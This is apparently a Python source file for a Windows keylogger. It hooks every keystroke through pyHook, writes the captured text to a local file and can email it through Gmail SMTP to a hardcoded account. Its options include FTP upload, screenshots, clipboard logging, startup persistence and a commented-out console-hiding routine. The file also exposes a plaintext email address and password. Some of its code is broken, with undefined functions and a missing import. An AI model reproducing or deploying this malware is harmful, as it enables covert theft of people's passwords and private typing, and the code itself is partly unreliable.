# Python code for keylogger
# to be used in windows
import win32api
import win32console
import win32gui
import pythoncom, pyHook
import sys
import smtplib
import threading
import win32api
import time

# win = win32console.GetConsoleWindow()
# win32gui.ShowWindow(win, 0)

strEmailAc = "matthewvinck@gmail.com"
strEmailPass = "mattywow0123"

blnFTP = "False"  # if using ftp set this to True and configure the options below
strFtpServer = ""
intFtpPort = 21
strFtpUser = ""
strFtpPass = ""
strFtpRemotePath = "/"

intCharPerSend = 20  # set num of chars before send log/store

blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
intTimePerSend = 120  # set how often to send/save logs in seconds

blnStoreLocal = "True"  # True to save logs/screens locally
strLogFile = "C:\Users\Matthew\Desktop\Keylog.base\output.txt"  # set non-protected path to text file eg. c:/temp/test.txt

blnScrShot = "False"  # set to True for capturing screenshots
strScrDir = ""  # set non-protected dir for scrshot location if storing locally. eg c:/temp
intScrTime = 120  # set time for taking screen in seconds

blnLogClick = "False"  # for logging window clicks
blnAddToStartup = "False"

blnLogClipboard = "False"
blnMelt = "False"

def hide():
   # window = win32console.GetConsoleWindow()
   # win32gui.ShowWindow(window, 0)
    return True
# hide window as new thread. Necessary in order to define timer used later
objTimer = threading.Timer(0, hide); objTimer.start()


def OnKeyboardEvent(event):
    global strLogs, objTimer, intLogChars, objTimer2
    try:  # check to see if variable is defined
        strLogs
    except NameError:
        strLogs = ""
	try:
		intLogChars
	except NameError:
		intLogChars = 0

    def SendMessages(strLogs, strEmailAc, strEmailPass):
        global blnFirstSend  # easier to just define this variable to be global within the functions
        try:
            if blnFirstSend == "True":
                strDateTime = "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")
                strMessage = strDateTime + "\n\n" + strLogs
                blnFirstSend = "False"
            else:
                strMessage = strLogs

            strMessage = "Subject: {}\n\n{}".format("New Keylogger Logs From ", strMessage)

            SmtpServer = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            SmtpServer.ehlo()   # identifies you to the smtp server
            SmtpServer.login(strEmailAc, strEmailPass)
            SmtpServer.sendmail(strEmailAc, strEmailAc, strMessage)
            SmtpServer.close()
        except:
            time.sleep(10)  # if the email cannot be sent, try again every 10 seconds
            SendMessages(strLogs, strEmailAc, strEmailPass)

    def StoreMessagesLocal(strLogs):
        global blnFirstSend
        # log keys locally
        if os.path.isfile(strLogFile):
            objLogFile = open(strLogFile, 'a')
        else:
            objLogFile = open(strLogFile, 'w')
        if blnFirstSend == "True":
            objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
            blnFirstSend = "False"
        objLogFile.write(strLogs)
        objLogFile.close()

    def CreateNewThreadMessages():  # function for creating thread for sending messages
        if not strLogs == "":
            if blnStoreLocal == "True":
                StoreLogThread = threading.Thread(target=StoreMessagesLocal, args=strLogs)
                StoreLogThread.daemon = True
                StoreLogThread.start()
            elif blnFTP == "True":
                SendFTPThread = threading.Thread(target=SendMessagesFTP, args=(strLogs, strFtpServer, intFtpPort, strFtpUser, strFtpPass, strFtpRemotePath))
                SendFTPThread.daemon = True
                SendFTPThread.start()
            else:
                SendMailThread = threading.Thread(target=SendMessages, args=(strLogs, strEmailAc, strEmailPass))
                SendMailThread.daemon = True
                SendMailThread.start()


    if event.Ascii == 8:
        strLogs = strLogs + " [Bck] "
    elif event.Ascii == 9:
        strLogs = strLogs + " [Tab] "
    elif event.Ascii == 13:
        strLogs = strLogs + "\n"
    elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
        pass
    else:
        intLogChars += 1
        strLogs = strLogs + chr(event.Ascii)

    if blnUseTime == "True":  # if the user is sending messages by timer
        if not objTimer.is_alive():  # check to see if the timer is not active
            objTimer = threading.Timer(intTimePerSend, CreateNewThreadMessages)
            objTimer.daemon = True
            objTimer.start()
            strLogs = ""; intLogChars = 0
    else:
        if intLogChars >= intCharPerSend:  # send/save message if log is certain length
            CreateNewThreadMessages()
            strLogs = ""; intLogChars = 0

    if blnScrShot == "True":  # if the user is capturing screenshots
        if not objTimer2.is_alive():
            objTimer2 = threading.Timer(intScrTime, TakeScr)
            objTimer2.daemon = True
            objTimer2.start()

    return True  # return True to pass key to windows



				
				
				
# def OnKeyboardEvent(event):
	# if event.Ascii == 5:
		# _exit(1)
	# if event.Ascii != 0 or 8:
	# #open output.txt to read current keystrokes
		# f = open('C:\Users\Matthew\Desktop\Keylog.base\Output.txt', 'r+')
		# buffer = f.read()
		# f.close()
	# # open output.txt to write current + new keystrokes
		# f = open('C:\Users\Matthew\Desktop\Keylog.base\Output.txt', 'w')
		# keylogs = chr(event.Ascii)
	# if event.Ascii == 13:
		# keylogs = '/n'
	# buffer += keylogs
	# f.write(buffer)
	# f.close()
	
		
# f1 = open('C:\Users\Matthew\Desktop\Keylog.base\Output.txt', 'w')
# f1.write('Incoming keys:\n')
# f1.close()


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
